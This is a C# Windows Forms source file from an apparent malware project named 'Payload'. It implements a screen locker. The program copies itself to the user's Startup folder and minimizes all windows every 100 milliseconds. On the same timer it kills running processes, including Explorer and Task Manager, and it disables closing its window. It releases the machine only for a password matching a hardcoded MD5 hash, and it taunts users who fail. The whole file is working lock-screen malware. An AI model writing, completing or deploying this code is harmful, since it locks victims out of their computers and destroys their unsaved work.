using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Security.Cryptography;
using System.IO;

namespace Payload
{
    public partial class LockForm : Form
    {
        /// <summary>
        /// Whether only processes with window titles will be killed.
        /// </summary>
        private static bool OnlyKillProcessesWithWindowTitles = true;

        /// <summary>
        /// Whether system processes with their names included in the SystemProcesses string array will not be killed.
        /// </summary>
        private static bool PreventKillingSystemProcesses = true;

        /// <summary>
        /// A string array containing the names of essential system processes. By default, these processes will not be killed.
        /// </summary>
        private static string[] SystemProcesses = { "spoolsv", "lsass", "csrss", "smss", "winlogon", "svchost", "services", "audiodg" };

        /// <summary>
        /// A timer that, with every tick, prevents normal computer usage.
        /// </summary>
        private static Timer DisableTimer = new Timer();

        /// <summary>
        /// The MD5 of the password.
        /// </summary>
        private static string Password = "5f4dcc3b5aa765d61d8327deb882cf99";

        /// <summary>
        /// The filepath of the executable, including the filename, that should be placed in the startup folder.
        /// </summary>
        public static string StartupFilepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Process.GetCurrentProcess().ProcessName + ".exe";

        public LockForm()
        {
            InitializeComponent();
            CopyToStartup();
            InitializeDisableTimer();
            this.TextBoxPassword.PasswordChar = '\u25CF';
        }

        /// <summary>
        /// Copies this executable to the user's startup folder.
        /// </summary>
        private void CopyToStartup()
        {
            try
            {
                File.Copy(Application.ExecutablePath, StartupFilepath);
            }
            catch
            {
                // Meh.
            }
        }

        /// <summary>
        /// Attempts to remove this executable from the user's startup folder.
        /// </summary>
        private void RemoveFromStartup()
        {
            if (DeleteFile(StartupFilepath))
            {
                // File deleted successfully; the file in the startup folder was not this process.
                Program.ExternalDeletion = false;
            }
            else
            {
                // Could not delete the file, most likely the file in the startup folder was the one running.
                Program.ExternalDeletion = true;
            }
        }

        private bool DeleteFile(string filepath)
        {
            try
            {
                File.Delete(filepath);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void InitializeDisableTimer()
        {
            DisableTimer.Interval = 100;
            DisableTimer.Tick += Disable;
            DisableTimer.Start();
        }

        /// <summary>
        /// A repeated action that, on every tick, will minimize all other windows and kill processes.
        /// </summary>
        private void Disable(object sender, EventArgs e)
        {
            MinimizeWindows();
            KillAllProcesses(OnlyKillProcessesWithWindowTitles, PreventKillingSystemProcesses);
        }

        private void ButtonSubmit_Click(object sender, EventArgs e)
        {
            // Check if the submitted password is correct.
            if (HashString(TextBoxPassword.Text) != Password)
            {
                // Incorrect password.
                TextBoxPassword.Clear();
                MessageBox.Show("Sorry. We can't let you go that easily." + Environment.NewLine + "You're better off giving up.", "Hm...", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                // Correct password.
                TextBoxPassword.Clear();
                MessageBox.Show("How wonderfully lucky. You're a special one, aren't you?", "Well well well.", MessageBoxButtons.OK, MessageBoxIcon.Information);
                // Stop the disable tick.
                DisableTimer.Stop();
                // Restart explorer.exe process.
                Process.Start(Path.Combine(Environment.GetEnvironmentVariable("windir"), "explorer.exe"));
                RemoveFromStartup();
                this.Close();
                this.Dispose();
            }
        }

        /// <summary>
        /// Minimizes all windows.
        /// </summary>
        private void MinimizeWindows()
        {
            Type typeShell = Type.GetTypeFromProgID("Shell.Application");
            object objShell = Activator.CreateInstance(typeShell);
            typeShell.InvokeMember("MinimizeAll", System.Reflection.BindingFlags.InvokeMethod, null, objShell, null);
        }

        /// <summary>
        /// Attempts to kill all available processes, including Explorer and Task Manager.
        /// </summary>
        /// <param name="onlyProcessesWithWindowTitles">Whether to only kill processes with window titles.</param>
        /// <param name="saveSystemProcesses">Whether to prevent killing any essential system processes.</param>
        private void KillAllProcesses(bool onlyProcessesWithWindowTitles = false, bool saveSystemProcesses = true)
        {
            Process[] ProcessList = Process.GetProcesses();
            // Loop through all processes to kill them.
            foreach (Process p in ProcessList)
            {
                if (!p.Equals(Process.GetCurrentProcess()) && p.MainWindowTitle != Process.GetCurrentProcess().MainWindowTitle)
                {
                    // Current process is not this process. Thus, we can kill this process.

                    if (p.ProcessName != "explorer" && p.ProcessName != "taskmgr" && onlyProcessesWithWindowTitles)
                    {
                        // Check for a window title.
                        if (!string.IsNullOrEmpty(p.MainWindowTitle))
                        {
                            // Has a window title. Attempt to kill.
                            KillProcess(p, saveSystemProcesses);
                        }
                        else
                        {
                            // Does not have a window title. Do not kill.
                        }
                    }
                    else
                    {
                        // No need to check window titles. Just kill the process.
                        KillProcess(p, saveSystemProcesses);
                    }
                }
            }
        }

        /// <summary>
        /// Attempts to kill an individual process, p.
        /// </summary>
        /// <param name="p">The Process object to attempt to kill.</param>
        /// <param name="saveSystemProcesses">Whether to prevent killing any essential system processes.</param>
        private void KillProcess(Process p, bool saveSystemProcesses)
        {
            if (saveSystemProcesses && SystemProcesses.Contains(p.ProcessName))
            {
                // Don't kill a system process.
            }
            else
            {
                // OK to kill process.
                try
                {
                    p.Kill();
                }
                catch
                {
                    // Huh?
                }
            }
        }

        /// <summary>
        /// Hashes a string with the MD5 algorithm.
        /// </summary>
        /// <param name="input">The string to hash.</param>
        /// <returns>Returns a MD5-hashed string.</returns>
        public static string HashString(string input)
        {
            MD5 md5 = MD5.Create();
            byte[] b = Encoding.UTF8.GetBytes(input);
            byte[] h = md5.ComputeHash(b);
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < h.Length; i++)
                sb.Append(h[i].ToString("x2"));
            return sb.ToString();
        }

        /// <summary>
        /// Disables closing the form using the ALT + F4 keystroke.
        /// </summary>
        protected override CreateParams CreateParams
        {
            get
            {
                const int ncl = 0x200;
                CreateParams cp = base.CreateParams;
                cp.ClassStyle |= ncl;
                return cp;
            }
        }
    }
}
